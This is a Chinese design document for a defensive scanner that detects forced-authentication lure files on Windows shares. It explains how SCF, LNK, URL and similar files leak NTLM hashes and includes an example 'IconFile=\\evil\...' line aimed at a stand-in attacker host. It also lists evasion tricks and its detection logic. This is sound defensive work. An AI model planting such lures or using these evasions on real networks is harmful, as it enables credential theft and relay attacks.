# 强制认证诱饵:攻击原理与 ShareGuard 检测逻辑

## 1. 攻击链复盘

```
攻击者                          员工终端                       攻击者 SMB/HTTP 服务器
  |                                |                                  |
  |  在共享目录投放诱饵文件         |                                  |
  |  (scf/url/lnk/searchConnector) |                                  |
  |------------------------------->|                                  |
  |                                |  员工浏览目录(资源管理器渲染图标) |
  |                                |  解析 IconFile=\\evil\share\i.ico|
  |                                |  自动发起 SMB 连接 + NTLM 协商     |
  |                                |--------------------------------->|
  |                                |        返回挑战(Challenge)       |
  |                                |<---------------------------------|
  |                                |  回送 NTLMv2 响应(含口令哈希)    |
  |                                |--------------------------------->|
  |                                |                            捕获哈希
  |                                |                     ┌──────────┴─────────┐
  |                                |                     │ 离线破解 → 明文口令 │
  |                                |                     │ NTLM 中继 → 登录他机│
  |                                |                     └────────────────────┘
```

关键点:**受害者无需双击文件**,资源管理器为了在图标视图里显示图标,会主动连接 `IconFile`
指向的网络位置。整个过程对用户不可见。

### 各类文件的利用方式

- **SCF**:最经典的载体。一个 `IconFile=\\evil\icon.ico` 就够,文件极小,浏览目录即触发。
- **LNK**:除图标外,网络目标(CommonNetworkRelativeLink)本身就是 UNC;支持 UTF-16、
  环境变量、嵌套 ExtraData,便于隐藏。
- **URL / website**:`URL=` 指向返回 `401 WWW-Authenticate: Negotiate` 的 HTTP 服务器,
  或用 UNC 图标走 SMB。
- **desktop.ini**:文件夹级配置,可让进入该文件夹的任何人触发。
- **searchConnector-ms / library-ms / osdx**:连接器位置与图标均可指向外部,
  联合搜索还能把搜索请求转发到攻击者服务器。

## 2. 检测引擎架构

```
                          ┌─────────────────────────────────────┐
  扫描根(多个) ─────────▶ │ 枚举生产者(异步、每根一个任务)       │
                          │  扩展名预过滤 → 候选文件              │
                          └───────────────┬─────────────────────┘
                                          │ await 写入(背压)
                                          ▼
                          ┌─────────────────────────────────────┐
                          │ 有界 Channel(容量可配,内存可控)     │
                          └───────────────┬─────────────────────┘
                                          │ 多消费者并行读取
                  ┌───────────────────────┼───────────────────────┐
                  ▼                       ▼                       ▼
            ┌──────────┐            ┌──────────┐            ┌──────────┐
            │ FileAnalyzer│ ...     │ FileAnalyzer│          │ FileAnalyzer│
            │ 1.解析引用  │          │            │          │            │
            │ 2.主机分级  │          └──────────┘            └──────────┘
            │ 3.汇总结论  │
            └──────┬─────┘
                   │ 线程安全回调
        ┌──────────┼──────────────┐
        ▼          ▼              ▼
   JSONL/CSV   控制台        隔离区(可选)
```

### 引用提取的纵深

1. **结构化解析**:LNK 按 MS-SHLLINK 读 Header/LinkInfo/CommonNetworkRelativeLink/
   StringData;INI 类按 section/key 提取;XML 类按属性与文本节点提取。
2. **字符串扫描兜底**:对整个二进制做 ASCII 与 UTF-16LE(偶数/奇数双相位)字符串提取,
   再跑 UNC/URL 正则。覆盖畸形 LNK、未知二进制变体、ExtraData 未结构化部分。
3. **统一引用模型**:所有来源归一化为 `EmbeddedReference`(scheme/host/port/凭据标记/偏移),
   分级逻辑与文件格式彻底解耦。

## 3. 主机分级决策树

```
引用含主机?
├─ 否(本地路径/环境变量) ──────────────▶ NoHost → Benign
├─ 回环(127.0.0.1/localhost/::1) ─────▶ Loopback → Benign
├─ 显式主机白名单命中 ─────────────────▶ AllowedInternal → Benign
├─ IP 字面量
│   ├─ 链路本地/多播 ─────────────────▶ LinkLocal → Suspicious
│   ├─ 命中内部 CIDR ─────────────────▶ AllowedInternal → Benign
│   └─ 其他(含公网 IP)───────────────▶ UnknownIp → Malicious
├─ 单标签名(无点)
│   ├─ 在批准清单内 ──────────────────▶ AllowedInternal → Benign
│   └─ 陌生名(LLMNR/NBT-NS 投毒面)──▶ SingleLabel → Suspicious(人工复核)
└─ 多标签域名
    ├─ 匹配企业后缀 ──────────────────▶ AllowedInternal → Benign
    ├─ 匹配待观察后缀 ────────────────▶ UntrustedSuffix → Malicious(过渡期可降权)
    └─ 其他 ──────────────────────────▶ External → Malicious
```

加重因子(独立于上述判定叠加):内嵌 userinfo 凭据、非标准端口、`dav(s)://`、明文 HTTP。

## 4. 防绕过设计

| 绕过尝试 | 应对 |
|---|---|
| IPv4 映射 IPv6(`::ffff:1.2.3.4`)躲 CIDR | 匹配前统一 `MapToIPv4()` 还原 |
| 主机名尾点、大小写混淆 | 规范化:去尾点、小写、去 IPv6 方括号 |
| UTF-16LE 编码藏匿 UNC | 双相位 UTF-16 扫描,解码后再匹配 |
| 畸形/截断 LNK 使结构化解析失败 | 字符串扫描兜底,失败不产生漏报 |
| 盘符前缀拼接(`C:\\Windows` 双斜杠) | UNC 正则校验前驱字符,排除盘符 |
| 设备路径(`\\.\pipe`)伪装 | 主机段 `.`/`?` 过滤 |
| 扫描期产生 DNS 外发被察觉 | 全离线分级,绝不主动解析主机名 |
| 单标签名让工具误报内部服务器 | 只判 Suspicious,白名单人工收敛 |

## 5. 已知边界与取舍

- **不做主动 DNS 解析**:避免扫描流量外泄、保证千万级吞吐;代价是无法基于真实 IP 给域名
  定级,完全依赖后缀白名单。后缀白名单的维护质量决定检测效果。
- **WebClient 禁用的兼容性**:依赖 WebDAV 映射驱动器的业务需在试点阶段排查,必要时只保留
  防火墙规则而不禁用服务。
- **检查点粒度是目录**:中断恢复时已完成目录整体跳过,目录内在途文件以报告中的错误为准;
  要求最严格时可删除检查点全量重扫。
- **NTLM 中继的网络层缓解**( SMB 签名、EPA/LDAP 通道绑定)需配合服务器侧配置,本工具覆盖
  终端侧与共享文件侧。
